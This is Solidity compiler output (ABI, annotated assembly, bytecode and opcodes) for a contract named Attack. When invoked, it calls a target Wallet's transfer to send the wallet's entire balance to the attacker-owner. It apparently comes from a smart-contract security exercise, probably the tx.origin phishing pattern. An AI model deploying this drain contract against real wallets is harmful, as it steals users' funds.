{
	"contracts/Attack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Wallet",
							"name": "_wallet",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address payable",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Attack.sol\":82:377  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Attack.sol\":158:272  constructor(Wallet _wallet) public  {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Attack.sol\":220:227  _wallet */\n  dup1\n    /* \"contracts/Attack.sol\":204:210  wallet */\n  0x01\n  0x00\n    /* \"contracts/Attack.sol\":204:228  wallet = Wallet(_wallet) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Attack.sol\":254:264  msg.sender */\n  caller\n    /* \"contracts/Attack.sol\":238:243  owner */\n  0x00\n  dup1\n    /* \"contracts/Attack.sol\":238:265  owner = payable(msg.sender) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Attack.sol\":158:272  constructor(Wallet _wallet) public  {... */\n  pop\n    /* \"contracts/Attack.sol\":82:377  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:176   */\ntag_8:\n    /* \"#utility.yul\":77:82   */\n  0x00\n    /* \"#utility.yul\":108:114   */\n  dup2\n    /* \"#utility.yul\":102:115   */\n  mload\n    /* \"#utility.yul\":93:115   */\n  swap1\n  pop\n    /* \"#utility.yul\":124:170   */\n  tag_10\n    /* \"#utility.yul\":164:169   */\n  dup2\n    /* \"#utility.yul\":124:170   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":7:176   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":182:559   */\ntag_3:\n    /* \"#utility.yul\":265:271   */\n  0x00\n    /* \"#utility.yul\":314:316   */\n  0x20\n    /* \"#utility.yul\":302:311   */\n  dup3\n    /* \"#utility.yul\":293:300   */\n  dup5\n    /* \"#utility.yul\":289:312   */\n  sub\n    /* \"#utility.yul\":285:317   */\n  slt\n    /* \"#utility.yul\":282:401   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":320:399   */\n  tag_14\n  tag_15\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":282:401   */\ntag_13:\n    /* \"#utility.yul\":440:441   */\n  0x00\n    /* \"#utility.yul\":465:542   */\n  tag_16\n    /* \"#utility.yul\":534:541   */\n  dup5\n    /* \"#utility.yul\":525:531   */\n  dup3\n    /* \"#utility.yul\":514:523   */\n  dup6\n    /* \"#utility.yul\":510:532   */\n  add\n    /* \"#utility.yul\":465:542   */\n  tag_8\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":455:542   */\n  swap2\n  pop\n    /* \"#utility.yul\":411:552   */\n  pop\n    /* \"#utility.yul\":182:559   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":646:742   */\ntag_19:\n    /* \"#utility.yul\":683:690   */\n  0x00\n    /* \"#utility.yul\":712:736   */\n  tag_21\n    /* \"#utility.yul\":730:735   */\n  dup3\n    /* \"#utility.yul\":712:736   */\n  tag_22\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":701:736   */\n  swap1\n  pop\n    /* \"#utility.yul\":646:742   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":748:857   */\ntag_23:\n    /* \"#utility.yul\":798:805   */\n  0x00\n    /* \"#utility.yul\":827:851   */\n  tag_25\n    /* \"#utility.yul\":845:850   */\n  dup3\n    /* \"#utility.yul\":827:851   */\n  tag_19\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":816:851   */\n  swap1\n  pop\n    /* \"#utility.yul\":748:857   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":863:989   */\ntag_22:\n    /* \"#utility.yul\":900:907   */\n  0x00\n    /* \"#utility.yul\":940:982   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":933:938   */\n  dup3\n    /* \"#utility.yul\":929:983   */\n  and\n    /* \"#utility.yul\":918:983   */\n  swap1\n  pop\n    /* \"#utility.yul\":863:989   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1118:1235   */\ntag_15:\n    /* \"#utility.yul\":1227:1228   */\n  0x00\n    /* \"#utility.yul\":1224:1225   */\n  dup1\n    /* \"#utility.yul\":1217:1229   */\n  revert\n    /* \"#utility.yul\":1241:1389   */\ntag_11:\n    /* \"#utility.yul\":1327:1364   */\n  tag_31\n    /* \"#utility.yul\":1358:1363   */\n  dup2\n    /* \"#utility.yul\":1327:1364   */\n  tag_23\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1320:1325   */\n  dup2\n    /* \"#utility.yul\":1317:1365   */\n  eq\n    /* \"#utility.yul\":1307:1383   */\n  tag_32\n  jumpi\n    /* \"#utility.yul\":1379:1380   */\n  0x00\n    /* \"#utility.yul\":1376:1377   */\n  dup1\n    /* \"#utility.yul\":1369:1381   */\n  revert\n    /* \"#utility.yul\":1307:1383   */\ntag_32:\n    /* \"#utility.yul\":1241:1389   */\n  pop\n  jump\t// out\n    /* \"contracts/Attack.sol\":82:377  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Attack.sol\":82:377  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Attack.sol\":104:132  address payable public owner */\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_4\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_4:\n      pop\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Attack.sol\":278:374  function attack() public payable{... */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/Attack.sol\":104:132  address payable public owner */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Attack.sol\":278:374  function attack() public payable{... */\n    tag_10:\n        /* \"contracts/Attack.sol\":320:326  wallet */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":320:335  wallet.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"contracts/Attack.sol\":336:341  owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":351:357  wallet */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Attack.sol\":343:366  address(wallet).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/Attack.sol\":320:367  wallet.transfer(owner, address(wallet).balance) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Attack.sol\":278:374  function attack() public payable{... */\n      jump\t// out\n        /* \"#utility.yul\":7:149   */\n    tag_18:\n        /* \"#utility.yul\":110:142   */\n      tag_20\n        /* \"#utility.yul\":136:141   */\n      dup2\n        /* \"#utility.yul\":110:142   */\n      tag_21\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":105:108   */\n      dup3\n        /* \"#utility.yul\":98:143   */\n      mstore\n        /* \"#utility.yul\":7:149   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":155:273   */\n    tag_22:\n        /* \"#utility.yul\":242:266   */\n      tag_24\n        /* \"#utility.yul\":260:265   */\n      dup2\n        /* \"#utility.yul\":242:266   */\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":237:240   */\n      dup3\n        /* \"#utility.yul\":230:267   */\n      mstore\n        /* \"#utility.yul\":155:273   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":279:533   */\n    tag_8:\n        /* \"#utility.yul\":388:392   */\n      0x00\n        /* \"#utility.yul\":426:428   */\n      0x20\n        /* \"#utility.yul\":415:424   */\n      dup3\n        /* \"#utility.yul\":411:429   */\n      add\n        /* \"#utility.yul\":403:429   */\n      swap1\n      pop\n        /* \"#utility.yul\":439:526   */\n      tag_27\n        /* \"#utility.yul\":523:524   */\n      0x00\n        /* \"#utility.yul\":512:521   */\n      dup4\n        /* \"#utility.yul\":508:525   */\n      add\n        /* \"#utility.yul\":499:505   */\n      dup5\n        /* \"#utility.yul\":439:526   */\n      tag_18\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":279:533   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":539:903   */\n    tag_13:\n        /* \"#utility.yul\":676:680   */\n      0x00\n        /* \"#utility.yul\":714:716   */\n      0x40\n        /* \"#utility.yul\":703:712   */\n      dup3\n        /* \"#utility.yul\":699:717   */\n      add\n        /* \"#utility.yul\":691:717   */\n      swap1\n      pop\n        /* \"#utility.yul\":727:814   */\n      tag_29\n        /* \"#utility.yul\":811:812   */\n      0x00\n        /* \"#utility.yul\":800:809   */\n      dup4\n        /* \"#utility.yul\":796:813   */\n      add\n        /* \"#utility.yul\":787:793   */\n      dup6\n        /* \"#utility.yul\":727:814   */\n      tag_18\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":824:896   */\n      tag_30\n        /* \"#utility.yul\":892:894   */\n      0x20\n        /* \"#utility.yul\":881:890   */\n      dup4\n        /* \"#utility.yul\":877:895   */\n      add\n        /* \"#utility.yul\":868:874   */\n      dup5\n        /* \"#utility.yul\":824:896   */\n      tag_22\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":539:903   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":909:1013   */\n    tag_21:\n        /* \"#utility.yul\":954:961   */\n      0x00\n        /* \"#utility.yul\":983:1007   */\n      tag_32\n        /* \"#utility.yul\":1001:1006   */\n      dup3\n        /* \"#utility.yul\":983:1007   */\n      tag_33\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":972:1007   */\n      swap1\n      pop\n        /* \"#utility.yul\":909:1013   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1019:1145   */\n    tag_33:\n        /* \"#utility.yul\":1056:1063   */\n      0x00\n        /* \"#utility.yul\":1096:1138   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1089:1094   */\n      dup3\n        /* \"#utility.yul\":1085:1139   */\n      and\n        /* \"#utility.yul\":1074:1139   */\n      swap1\n      pop\n        /* \"#utility.yul\":1019:1145   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1151:1228   */\n    tag_25:\n        /* \"#utility.yul\":1188:1195   */\n      0x00\n        /* \"#utility.yul\":1217:1222   */\n      dup2\n        /* \"#utility.yul\":1206:1222   */\n      swap1\n      pop\n        /* \"#utility.yul\":1151:1228   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220613a7bbec855abc01f200e0a6d39efbc60d6827b4b4396c661952177630f1a8364736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506040516103af3803806103af833981810160405281019061003291906100ce565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061015b565b6000815190506100c881610144565b92915050565b6000602082840312156100e4576100e361013f565b5b60006100f2848285016100b9565b91505092915050565b60006101068261011f565b9050919050565b6000610118826100fb565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61014d8161010d565b811461015857600080fd5b50565b6102458061016a6000396000f3fe6080604052600436106100295760003560e01c80638da5cb5b1461002e5780639e5faafc14610059575b600080fd5b34801561003a57600080fd5b50610043610063565b604051610050919061018f565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b815260040161013d9291906101aa565b600060405180830381600087803b15801561015757600080fd5b505af115801561016b573d6000803e3d6000fd5b50505050565b61017a816101d3565b82525050565b61018981610205565b82525050565b60006020820190506101a46000830184610171565b92915050565b60006040820190506101bf6000830185610171565b6101cc6020830184610180565b9392505050565b60006101de826101e5565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600081905091905056fea2646970667358221220613a7bbec855abc01f200e0a6d39efbc60d6827b4b4396c661952177630f1a8364736f6c63430008070033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x3AF CODESIZE SUB DUP1 PUSH2 0x3AF DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xCE JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x15B JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xC8 DUP2 PUSH2 0x144 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE4 JUMPI PUSH2 0xE3 PUSH2 0x13F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF2 DUP5 DUP3 DUP6 ADD PUSH2 0xB9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x106 DUP3 PUSH2 0x11F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x118 DUP3 PUSH2 0xFB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x14D DUP2 PUSH2 0x10D JUMP JUMPDEST DUP2 EQ PUSH2 0x158 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x245 DUP1 PUSH2 0x16A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x2E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x18F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13D SWAP3 SWAP2 SWAP1 PUSH2 0x1AA JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x157 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x16B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x17A DUP2 PUSH2 0x1D3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x189 DUP2 PUSH2 0x205 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1A4 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x171 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x1BF PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x171 JUMP JUMPDEST PUSH2 0x1CC PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x180 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1DE DUP3 PUSH2 0x1E5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH2 0x3A7B 0xBE 0xC8 SSTORE 0xAB 0xC0 0x1F KECCAK256 0xE EXP PUSH14 0x39EFBC60D6827B4B4396C6619521 PUSH24 0x630F1A8364736F6C63430008070033000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "116200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"owner()": "2489"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"owner()": "8da5cb5b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 4,
						"contract": "contracts/Attack.sol:Attack",
						"label": "owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 7,
						"contract": "contracts/Attack.sol:Attack",
						"label": "wallet",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Wallet)96"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(Wallet)96": {
						"encoding": "inplace",
						"label": "contract Wallet",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}